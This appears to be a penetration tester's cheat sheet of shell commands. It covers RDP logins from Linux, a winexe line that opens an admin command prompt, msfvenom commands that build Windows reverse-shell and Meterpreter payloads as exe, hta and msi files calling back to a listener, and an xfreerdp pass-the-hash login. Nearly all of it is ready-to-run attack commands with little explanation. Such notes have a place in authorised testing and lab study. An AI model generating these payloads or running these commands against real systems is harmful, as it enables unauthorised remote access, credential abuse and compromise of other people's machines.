***
##  RDP From Linux

```bash
xfreerdp /u:"user" /d:"domain" /p:"password" /v:"target_ip"

xfreerdp /u:USERNAME /p:PASSWORD /cert:ignore /v:IP_ADDRESS

xfreerdp /cert-ignore /compression /auto-reconnect /u:USERNAME /p:PASSWORD /v:IP_ADDRESS

xfreerdp +bitmap-cache /compression-level:2 /kbd:40A  /u:USERNAME /p:PASSWORD /v:IP_ADDRESS  /size:1500x1300

xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /drive:tmp,. /u:USERNAME  /p:PASSWORD /v:IP_ADDRESS

rdesktop -u USERNAME -p PASSWORD -a 16 -P -z -b -g 1280x860 IP_ADDRESS

#use the winexe command to spawn a command prompt running with the admin privileges
winexe -U 'admin%password' //MACHINE_IP cmd.exe

```
***

## MSF-Venom
```bash
## Generate a Reverse Shell Executable

# list payloads based on architecture & OS
msfvenom -l payloads --platform windows --arch x64
# differentiate stages vs. unstaged
# if the payload has a '/' between shell & reverse TCP, it's a staged payload, else not.
# windows/x64/meterpreter/shell_reverse_tcp vs. windows/x64/meterpreter/shell/reverse_tcp
# payload examples
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9090 -f exe -o reverse_9090.exe

msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9090 -f hta-psh -o shell_9090.hta

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9090 -f exe -o shell_9090.exe

msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=9090 -f exe -o shell_9090.exe # non meterpreter shell.

msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9090 -f msi -o reverse.msi

```
***
### XFreeRDP
```bash
xfreerdp /u:'Username' /p:'Password' /v:'IPAddress' /d:'domain' /pth:'hash' /cert:ignore
```
